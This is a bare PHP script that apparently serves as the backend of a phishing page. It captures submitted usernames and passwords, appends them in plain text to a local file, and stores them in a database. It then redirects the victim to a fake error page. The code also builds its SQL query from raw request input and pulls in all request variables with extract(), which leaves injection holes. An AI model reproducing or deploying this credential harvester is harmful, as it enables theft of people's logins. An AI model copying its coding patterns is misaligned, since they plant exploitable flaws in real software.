<?php
    extract($_REQUEST);
  
    	$file=fopen('new.txt', 'a');
    	fwrite($file, "name[");
    	fwrite($file, $username ."]\n");
    	fwrite($file, "Pass[");
    	fwrite($file, $pass ."]\n");
    	fclose($file);
  	
  	$dbhost = "localhost";
  	$dbpass = "";
  	$dbuser = "root";
  	$dbname = "info";
  	
    $dbconn = mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);
  	
  	$qure = "insert into inf(user,pass) value('$username','$pass')";
  	
  	$res = mysqli_query($dbconn,$qure);
  	
  	if ($res) {
  	   header("location: Eror/index.html");
  	}else
  	echo("some thing is wrong plz chack conection or     contact suplaiyar 😥");
  	exit;
?>
